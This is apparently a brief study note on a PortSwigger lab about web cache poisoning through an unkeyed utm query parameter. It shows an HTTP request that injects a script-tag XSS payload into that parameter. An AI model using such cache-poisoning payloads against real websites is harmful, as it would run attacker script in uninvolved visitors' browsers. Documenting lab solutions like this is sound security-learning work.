# [Web cache poisoning via an unkeyed query parameter] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-03
 
---
 
## Vulnerability / core concept
Web Cache Poisoning

---


## Payload / key command
When I intercepted the `GET / HTTP/2` request, I sent it to Repeater. Then I ran `Param Miner` to find query parameters. Param Miner found me `utm_contetn` parameter that is used by google for analytics and most of the time web application exclude this paramters from cache. Therefore, we can inject malicious value into this query parameter and execute arbitrary js code in victims' browser:
```bash
GET /?utm_content='/><script>alert(1)</script> HTTP/2
Host: 0a1c005504b5136882a9563000fc0049.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
...

```


